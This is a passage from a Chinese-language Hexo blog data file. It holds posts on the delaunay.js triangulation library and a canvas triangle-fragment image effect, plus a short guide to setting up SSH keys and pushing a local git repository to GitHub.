title=\"详述\"></a>详述</h1><p>对于delaunay.js，官方没有接口文档，只给了一个示例：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var canvas = document.getElementById(&quot;canvas&quot;),</span><br><span class=\"line\">    ctx = canvas.getContext(&quot;2d&quot;),</span><br><span class=\"line\">    vertices = new Array(4),</span><br><span class=\"line\">    i, x, y;</span><br><span class=\"line\"></span><br><span class=\"line\">for(i = vertices.length; i--; ) &#123;</span><br><span class=\"line\">  do &#123;</span><br><span class=\"line\">    x = Math.random() - 0.5;</span><br><span class=\"line\">    y = Math.random() - 0.5;</span><br><span class=\"line\">  &#125; while(x * x + y * y &gt; 0.25);</span><br><span class=\"line\"></span><br><span class=\"line\">  x = (x * 0.96875 + 0.5) * canvas.width;</span><br><span class=\"line\">  y = (y * 0.96875 + 0.5) * canvas.height;</span><br><span class=\"line\"></span><br><span class=\"line\">  vertices[i] = [x, y];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(vertices);</span><br><span class=\"line\">console.time(&quot;triangulate&quot;);</span><br><span class=\"line\">var triangles = Delaunay.triangulate(vertices);</span><br><span class=\"line\">console.log(triangles);</span><br><span class=\"line\">console.timeEnd(&quot;triangulate&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">for(i = triangles.length; i; ) &#123;</span><br><span class=\"line\">  ctx.beginPath();</span><br><span class=\"line\">  --i; ctx.moveTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);</span><br><span class=\"line\">  --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);</span><br><span class=\"line\">  --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);</span><br><span class=\"line\">  ctx.closePath();</span><br><span class=\"line\">  ctx.stroke();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上半部分是获得点集vertices，下半部分是根据算出的三角端点绘制图形，重点就是中间的一行代码<code>var triangles = Delaunay.triangulate(vertices);</code>，这个就是调用接口，传入端点集生成三角端点索引。多说一句，vertices是二维数组表示的端点集，triangles是需要依次绘制的三角形的端点索引值。</p>\n<h2 id=\"绘图展示\"><a href=\"#绘图展示\" class=\"headerlink\" title=\"绘图展示\"></a>绘图展示</h2><p>三个点，一个三角面，四个点，两个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay3.jpg\" alt=\"四点两面\"><br>但是细想下发现，四个点，可能三个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay4.jpg\" alt=\"四点三面\"></p>\n<h2 id=\"数据展示\"><a href=\"#数据展示\" class=\"headerlink\" title=\"数据展示\"></a>数据展示</h2><p>四个点，两个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay1.jpg\" alt=\"四点两面\"><br><img src=\"/2018-2018-08-01-delaunay-1/delaunay5.jpg\" alt=\"四点两面\"><br>四个点，三个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay2.jpg\" alt=\"四点三面\"><br><img src=\"/2018-2018-08-01-delaunay-1/delaunay6.jpg\" alt=\"四点两面\"></p>\n<h2 id=\"更多点展示\"><a href=\"#更多点展示\" class=\"headerlink\" title=\"更多点展示\"></a>更多点展示</h2><p><a href=\"https://travellermap.com/tmp/delaunay.htm\" target=\"_blank\" rel=\"noopener\">delaunay算法在线展示</a></p>\n<p>这篇主要讲下三角剖分的概念及delaunay.js的理解和使用，下一篇将讲下具体的图片三角切分。</p>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p><a href=\"http://www.html5-css3.cn/article/9438\" target=\"_blank\" rel=\"noopener\">国内整理者</a></p>\n<p><a href=\"https://zachsaucier.com/\" target=\"_blank\" rel=\"noopener\">原作者主页</a></p>\n<p><a href=\"https://codepen.io/Zeaklous/pen/raltF\" target=\"_blank\" rel=\"noopener\">codepen效果展示</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>网上看到一种图片播放的效果，类似玻璃片碎裂，于是深究下去，发现源头来自一个国外的示例，核心是用了一个开源的三角剖分算法的js库——<a href=\"https://github.com/ironwallaby/delaunay\" target=\"_blank\" rel=\"noopener\">delaunay.js</a>。因为之前没接触过，因此从零开始好好学习了下，在此记录下学习心得。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>从我们动效应用层面的理解是，在一个平面内，产生有限的点集，根据算法，划分成若干个三角面，这些三角面的合集是散点集的凸包。具体详细的理论知识有兴趣的可以深究下去：<a href=\"https://baike.baidu.com/item/%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86/10390049?fr=aladdin\" target=\"_blank\" rel=\"noopener\">三角剖分</a>，<a href=\"https://baike.baidu.com/item/Delaunay%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86%E7%AE%97%E6%B3%95/3779918\" target=\"_blank\" rel=\"noopener\">Delaunay三角剖分算法</a>，<a href=\"https://baike.baidu.com/item/%E5%87%B8%E5%8C%85\" target=\"_blank\" rel=\"noopener\">凸包</a>。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-01-delaunay-1/preview.gif\" alt=\"应用效果展示\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>对于delaunay.js，官方没有接口文档，只给了一个示例：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var canvas = document.getElementById(&quot;canvas&quot;),</span><br><span class=\"line\">    ctx = canvas.getContext(&quot;2d&quot;),</span><br><span class=\"line\">    vertices = new Array(4),</span><br><span class=\"line\">    i, x, y;</span><br><span class=\"line\"></span><br><span class=\"line\">for(i = vertices.length; i--; ) &#123;</span><br><span class=\"line\">  do &#123;</span><br><span class=\"line\">    x = Math.random() - 0.5;</span><br><span class=\"line\">    y = Math.random() - 0.5;</span><br><span class=\"line\">  &#125; while(x * x + y * y &gt; 0.25);</span><br><span class=\"line\"></span><br><span class=\"line\">  x = (x * 0.96875 + 0.5) * canvas.width;</span><br><span class=\"line\">  y = (y * 0.96875 + 0.5) * canvas.height;</span><br><span class=\"line\"></span><br><span class=\"line\">  vertices[i] = [x, y];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(vertices);</span><br><span class=\"line\">console.time(&quot;triangulate&quot;);</span><br><span class=\"line\">var triangles = Delaunay.triangulate(vertices);</span><br><span class=\"line\">console.log(triangles);</span><br><span class=\"line\">console.timeEnd(&quot;triangulate&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">for(i = triangles.length; i; ) &#123;</span><br><span class=\"line\">  ctx.beginPath();</span><br><span class=\"line\">  --i; ctx.moveTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);</span><br><span class=\"line\">  --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);</span><br><span class=\"line\">  --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);</span><br><span class=\"line\">  ctx.closePath();</span><br><span class=\"line\">  ctx.stroke();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上半部分是获得点集vertices，下半部分是根据算出的三角端点绘制图形，重点就是中间的一行代码<code>var triangles = Delaunay.triangulate(vertices);</code>，这个就是调用接口，传入端点集生成三角端点索引。多说一句，vertices是二维数组表示的端点集，triangles是需要依次绘制的三角形的端点索引值。</p>\n<h2 id=\"绘图展示\"><a href=\"#绘图展示\" class=\"headerlink\" title=\"绘图展示\"></a>绘图展示</h2><p>三个点，一个三角面，四个点，两个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay3.jpg\" alt=\"四点两面\"><br>但是细想下发现，四个点，可能三个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay4.jpg\" alt=\"四点三面\"></p>\n<h2 id=\"数据展示\"><a href=\"#数据展示\" class=\"headerlink\" title=\"数据展示\"></a>数据展示</h2><p>四个点，两个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay1.jpg\" alt=\"四点两面\"><br><img src=\"/2018-2018-08-01-delaunay-1/delaunay5.jpg\" alt=\"四点两面\"><br>四个点，三个三角面，如下图：<br><img src=\"/2018-2018-08-01-delaunay-1/delaunay2.jpg\" alt=\"四点三面\"><br><img src=\"/2018-2018-08-01-delaunay-1/delaunay6.jpg\" alt=\"四点两面\"></p>\n<h2 id=\"更多点展示\"><a href=\"#更多点展示\" class=\"headerlink\" title=\"更多点展示\"></a>更多点展示</h2><p><a href=\"https://travellermap.com/tmp/delaunay.htm\" target=\"_blank\" rel=\"noopener\">delaunay算法在线展示</a></p>\n<p>这篇主要讲下三角剖分的概念及delaunay.js的理解和使用，下一篇将讲下具体的图片三角切分。</p>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p><a href=\"http://www.html5-css3.cn/article/9438\" target=\"_blank\" rel=\"noopener\">国内整理者</a></p>\n<p><a href=\"https://zachsaucier.com/\" target=\"_blank\" rel=\"noopener\">原作者主页</a></p>\n<p><a href=\"https://codepen.io/Zeaklous/pen/raltF\" target=\"_blank\" rel=\"noopener\">codepen效果展示</a></p>"},{"title":"本地库上传到github","date":"2018-07-25T06:07:40.000Z","_content":"\n# 前言\n网络资源，笔记备忘。\n\n# 概述\n```\n$ git remote add origin git@github.com:yourName/yourRepo.git\n$ git pull origin master\n$ git add .\n$ git commit -m \"first commit\" \n$ git push origin master  \n\n```\n<!-- more -->\n# 详述\n\n1、首先在本地创建ssh key；\n\n$ ssh-keygen -t rsa -C \"your_email@youremail.com\"  \n\n后面的your_email@youremail.com改为你的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。\n\n2、回到github，进入Account Settings，左边选择SSH Keys，Add SSH Key,title随便填，粘贴key。为了验证是否成功，在Git bash下输入：\n\n$ ssh -T git@github.com  \n\n如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。\n\n3、接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。\n\n    $ git config --global user.name \"your name\"  \n    $ git config --global user.email \"your_email@youremail.com\"  \n\n进入要上传的仓库，右键git bash，添加远程地址：\n\n    $ git remote add origin git@github.com:yourName/yourRepo.git  (可以去git上复制仓库的地址)\n\n4.提交、上传\n\n接下来在本地仓库里添加一些文件，比如README，\n\n    $ git add README  \n    $ git commit -m \"first commit\" \n\n上传到github：\n\n    $ git push origin master  \n\ngit push命令会将本地仓库推送到远程服务器。\ngit pull命令则相反。\n\n[注意]：如果origin已经存在了，请使用  git remote rm origin ，然后再add origin 即可。\n\n# 备注\n来源：https://blog.csdn.net/bj123467/article/details/52981009","source":"_posts/2018/2018-07-25-repo-to-github.md","raw":"---\ntitle: 本地库上传到github\ntags:\n  - git\n  - 工具\ncategories:\n  - 其他\ndate: 2018-07-25 14:07:40\n---\n\n# 前言\n网络资源，笔记备忘。\n\n# 概述\n```\n$ git remote add origin git@github.com:yourName/yourRepo.git\n$ git pull origin master\n$ git add .\n$ git commit -m \"first commit\" \n$ git push origin master  \n\n```\n<!-- more -->\n# 详述\n\n1、首先在本地创建ssh key；\n\n$ ssh-keygen -t rsa -C \"your_email@youremail.com\"  \n\n后面的your_email@youremail.com改为你的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。\n\n2、回到github，进入Account Settings，左边选择SSH Keys，Add SSH Key,title随便填，粘贴key。为了验证是否成功，在Git bash下输入：\n\n$ ssh -T git@github.com  \n\n如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。\n\n3、接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。\n\n    $ git config --global user.name \"your name\"  \n    $ git config --global user.email \"your_email@youremail.com\"  \n\n进入要上传的仓库，右键git bash，添加远程地址：\n\n    $ git remote add origin git@github.com:yourName/yourRepo.git  (可以去git上复制仓库的地址)\n\n4.提交、上传\n\n接下来在本地仓库里添加一些文件，比如README，\n\n    $ git add README  \n    $ git commit -m \"first commit\" \n\n上传到github：\n\n    $ git push origin master  \n\ngit push命令会将本地仓库推送到远程服务器。\ngit pull命令则相反。\n\n[注意]：如果origin已经存在了，请使用  git remote rm origin ，然后再add origin 即可。\n\n# 备注\n来源：https://blog.csdn.net/bj123467/article/details/52981009","slug":"2018-2018-07-25-repo-to-github","published":1,"updated":"2019-04-29T12:29:15.014Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8ps000swovv8s1qdoou","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>网络资源，笔记备忘。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git remote add origin git@github.com:yourName/yourRepo.git</span><br><span class=\"line\">$ git pull origin master</span><br><span class=\"line\">$ git add .</span><br><span class=\"line\">$ git commit -m &quot;first commit&quot; </span><br><span class=\"line\">$ git push origin master</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>1、首先在本地创建ssh key；</p>\n<p>$ ssh-keygen -t rsa -C “<a href=\"mailto:your_email@youremail.com\" target=\"_blank\" rel=\"noopener\">your_email@youremail.com</a>“  </p>\n<p>后面的<a href=\"mailto:your_email@youremail.com\" target=\"_blank\" rel=\"noopener\">your_email@youremail.com</a>改为你的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。</p>\n<p>2、回到github，进入Account Settings，左边选择SSH Keys，Add SSH Key,title随便填，粘贴key。为了验证是否成功，在Git bash下输入：</p>\n<p>$ ssh -T <a href=\"mailto:git@github.com\" target=\"_blank\" rel=\"noopener\">git@github.com</a>  </p>\n<p>如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。</p>\n<p>3、接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。</p>\n<pre><code>$ git config --global user.name &quot;your name&quot;  \n$ git config --global user.email &quot;your_email@youremail.com&quot;  \n</code></pre><p>进入要上传的仓库，右键git bash，添加远程地址：</p>\n<pre><code>$ git remote add origin git@github.com:yourName/yourRepo.git  (可以去git上复制仓库的地址)\n</code></pre><p>4.提交、上传</p>\n<p>接下来在本地仓库里添加一些文件，比如README，</p>\n<pre><code>$ git add README  \n$ git commit -m &quot;first commit&quot; \n</code></pre><p>上传到github：</p>\n<pre><code>$ git push origin master  \n</code></pre><p>git push命令会将本地仓库推送到远程服务器。<br>git pull命令则相反。</p>\n<p>[注意]：如果origin已经存在了，请使用  git remote rm origin ，然后再add origin 即可。</p>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p>来源：<a href=\"https://blog.csdn.net/bj123467/article/details/52981009\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/bj123467/article/details/52981009</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>网络资源，笔记备忘。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git remote add origin git@github.com:yourName/yourRepo.git</span><br><span class=\"line\">$ git pull origin master</span><br><span class=\"line\">$ git add .</span><br><span class=\"line\">$ git commit -m &quot;first commit&quot; </span><br><span class=\"line\">$ git push origin master</span><br></pre></td></tr></table></figure>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>1、首先在本地创建ssh key；</p>\n<p>$ ssh-keygen -t rsa -C “<a href=\"mailto:your_email@youremail.com\" target=\"_blank\" rel=\"noopener\">your_email@youremail.com</a>“  </p>\n<p>后面的<a href=\"mailto:your_email@youremail.com\" target=\"_blank\" rel=\"noopener\">your_email@youremail.com</a>改为你的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。</p>\n<p>2、回到github，进入Account Settings，左边选择SSH Keys，Add SSH Key,title随便填，粘贴key。为了验证是否成功，在Git bash下输入：</p>\n<p>$ ssh -T <a href=\"mailto:git@github.com\" target=\"_blank\" rel=\"noopener\">git@github.com</a>  </p>\n<p>如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。</p>\n<p>3、接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。</p>\n<pre><code>$ git config --global user.name &quot;your name&quot;  \n$ git config --global user.email &quot;your_email@youremail.com&quot;  \n</code></pre><p>进入要上传的仓库，右键git bash，添加远程地址：</p>\n<pre><code>$ git remote add origin git@github.com:yourName/yourRepo.git  (可以去git上复制仓库的地址)\n</code></pre><p>4.提交、上传</p>\n<p>接下来在本地仓库里添加一些文件，比如README，</p>\n<pre><code>$ git add README  \n$ git commit -m &quot;first commit&quot; \n</code></pre><p>上传到github：</p>\n<pre><code>$ git push origin master  \n</code></pre><p>git push命令会将本地仓库推送到远程服务器。<br>git pull命令则相反。</p>\n<p>[注意]：如果origin已经存在了，请使用  git remote rm origin ，然后再add origin 即可。</p>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p>来源：<a href=\"https://blog.csdn.net/bj123467/article/details/52981009\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/bj123467/article/details/52981009</a></p>"},{"title":"三角碎片动效（三）——get fragments","date":"2018-08-06T09:19:05.000Z","_content":"# 前言\n接着上一篇[三角碎片动效（二）——get vertices](/2018/08/06/delaunay-2/)，这篇讲下两个核心之一生成碎片集（getFragments）。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n有了端点集vertices就可以调用delaunay.js的方法生成三角点集triangles，正如第一篇里讲到的，这个值是一个需要绘制三角的端点索引集，每三个值对应vertices中的三个端点，然后就是运用canvas知识生成图片碎片集fragments。\n## 效果展示\n![效果展示](1.jpg)\n\n<!-- more -->\n# 详述\n## 实现代码\n```\nfunction getFragments(vertices, image) {\n  var triangles = Delaunay.triangulate(vertices);\n\n  var fragments = [];\n\n  for (var i = 0; i < triangles.length; i += 3) {\n    var v0 = vertices[triangles[i + 0]];\n    var v1 = vertices[triangles[i + 1]];\n    var v2 = vertices[triangles[i + 2]];\n\n    var xMin = Math.min(v0[0], v1[0], v2[0]),\n      xMax = Math.max(v0[0], v1[0], v2[0]),\n      yMin = Math.min(v0[1], v1[1], v2[1]),\n      yMax = Math.max(v0[1], v1[1], v2[1]);\n\n    var box = {\n      x: Math.round(xMin),\n      y: Math.round(yMin),\n      w: Math.round(xMax - xMin),\n      h: Math.round(yMax - yMin)\n    };\n\n\n    var canvas = document.createElement('canvas');\n    canvas.width = box.w;\n    canvas.height = box.h;\n    canvas.style.width = box.w + 'px';\n    canvas.style.height = box.h + 'px';\n    canvas.style.left = box.x + 'px';\n    canvas.style.top = box.y + 'px';\n    var ctx = canvas.getContext('2d');\n\n    ctx.translate(-box.x, -box.y);\n    ctx.beginPath();\n    ctx.moveTo(v0[0], v0[1]);\n    ctx.lineTo(v1[0], v1[1]);\n    ctx.lineTo(v2[0], v2[1]);\n    ctx.closePath();\n    ctx.clip();\n    ctx.drawImage(image, 0, 0);\n\n\n\n    var fragment = {\n      canvas: canvas,\n      box: box\n    };\n\n    fragments.push(fragment);\n\n  }\n  return fragments;\n}\n```\n## 参数说明\nvertices：端点集；\nimage：图片对象，canvas的方法`drawImage`使用；\n\n# 后记\n这部分主要是canvas的使用，因为属于独立知识，因此不熟悉的请先学习下canvas的api。","source":"_posts/2018/2018-08-06-delaunay-3.md","raw":"---\ntitle: 三角碎片动效（三）——get fragments\ntags:\n  - 动效\n  - JavaScript\n  - canvas\ncategories:\n  - 前端\ndate: 2018-08-06 17:19:05\n---\n# 前言\n接着上一篇[三角碎片动效（二）——get vertices](/2018/08/06/delaunay-2/)，这篇讲下两个核心之一生成碎片集（getFragments）。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n有了端点集vertices就可以调用delaunay.js的方法生成三角点集triangles，正如第一篇里讲到的，这个值是一个需要绘制三角的端点索引集，每三个值对应vertices中的三个端点，然后就是运用canvas知识生成图片碎片集fragments。\n## 效果展示\n![效果展示](1.jpg)\n\n<!-- more -->\n# 详述\n## 实现代码\n```\nfunction getFragments(vertices, image) {\n  var triangles = Delaunay.triangulate(vertices);\n\n  var fragments = [];\n\n  for (var i = 0; i < triangles.length; i += 3) {\n    var v0 = vertices[triangles[i + 0]];\n    var v1 = vertices[triangles[i + 1]];\n    var v2 = vertices[triangles[i + 2]];\n\n    var xMin = Math.min(v0[0], v1[0], v2[0]),\n      xMax = Math.max(v0[0], v1[0], v2[0]),\n      yMin = Math.min(v0[1], v1[1], v2[1]),\n      yMax = Math.max(v0[1], v1[1], v2[1]);\n\n    var box = {\n      x: Math.round(xMin),\n      y: Math.round(yMin),\n      w: Math.round(xMax - xMin),\n      h: Math.round(yMax - yMin)\n    };\n\n\n    var canvas = document.createElement('canvas');\n    canvas.width = box.w;\n    canvas.height = box.h;\n    canvas.style.width = box.w + 'px';\n    canvas.style.height = box.h + 'px';\n    canvas.style.left = box.x + 'px';\n    canvas.style.top = box.y + 'px';\n    var ctx = canvas.getContext('2d');\n\n    ctx.translate(-box.x, -box.y);\n    ctx.beginPath();\n    ctx.moveTo(v0[0], v0[1]);\n    ctx.lineTo(v1[0], v1[1]);\n    ctx.lineTo(v2[0], v2[1]);\n    ctx.closePath();\n    ctx.clip();\n    ctx.drawImage(image, 0, 0);\n\n\n\n    var fragment = {\n      canvas: canvas,\n      box: box\n    };\n\n    fragments.push(fragment);\n\n  }\n  return fragments;\n}\n```\n## 参数说明\nvertices：端点集；\nimage：图片对象，canvas的方法`drawImage`使用；\n\n# 后记\n这部分主要是canvas的使用，因为属于独立知识，因此不熟悉的请先学习下canvas的api。","slug":"2018-2018-08-06-delaunay-3","published":1,"updated":"2019-05-28T07:14:01.491Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8pv000wwovvtgitnn34","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/06/delaunay-2/\">三角碎片动效（二）——get vertices</a>，这篇讲下两个核心之一生成碎片集（getFragments）。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>有了端点集vertices就可以调用delaunay.js的方法生成三角点集triangles，正如第一篇里讲到的，这个值是一个需要绘制三角的端点索引集，每三个值对应vertices中的三个端点，然后就是运用canvas知识生成图片碎片集fragments。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-06-delaunay-3/1.jpg\" alt=\"效果展示\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getFragments(vertices, image) &#123;</span><br><span class=\"line\">  var triangles = Delaunay.triangulate(vertices);</span><br><span class=\"line\"></span><br><span class=\"line\">  var fragments = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  for (var i = 0; i &lt; triangles.length; i += 3) &#123;</span><br><span class=\"line\">    var v0 = vertices[triangles[i + 0]];</span><br><span class=\"line\">    var v1 = vertices[triangles[i + 1]];</span><br><span class=\"line\">    var v2 = vertices[triangles[i + 2]];</span><br><span class=\"line\"></span><br><span class=\"line\">    var xMin = Math.min(v0[0], v1[0], v2[0]),</span><br><span class=\"line\">      xMax = Math.max(v0[0], v1[0], v2[0]),</span><br><span class=\"line\">      yMin = Math.min(v0[1], v1[1], v2[1]),</span><br><span class=\"line\">      yMax = Math.max(v0[1], v1[1], v2[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">    var box = &#123;</span><br><span class=\"line\">      x: Math.round(xMin),</span><br><span class=\"line\">      y: Math.round(yMin),</span><br><span class=\"line\">      w: Math.round(xMax - xMin),</span><br><span class=\"line\">      h: Math.round(yMax - yMin)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    var canvas = document.createElement(&apos;canvas&apos;);</span><br><span class=\"line\">    canvas.width = box.w;</span><br><span class=\"line\">    canvas.height = box.h;</span><br><span class=\"line\">    canvas.style.width = box.w + &apos;px&apos;;</span><br><span class=\"line\">    canvas.style.height = box.h + &apos;px&apos;;</span><br><span class=\"line\">    canvas.style.left = box.x + &apos;px&apos;;</span><br><span class=\"line\">    canvas.style.top = box.y + &apos;px&apos;;</span><br><span class=\"line\">    var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span 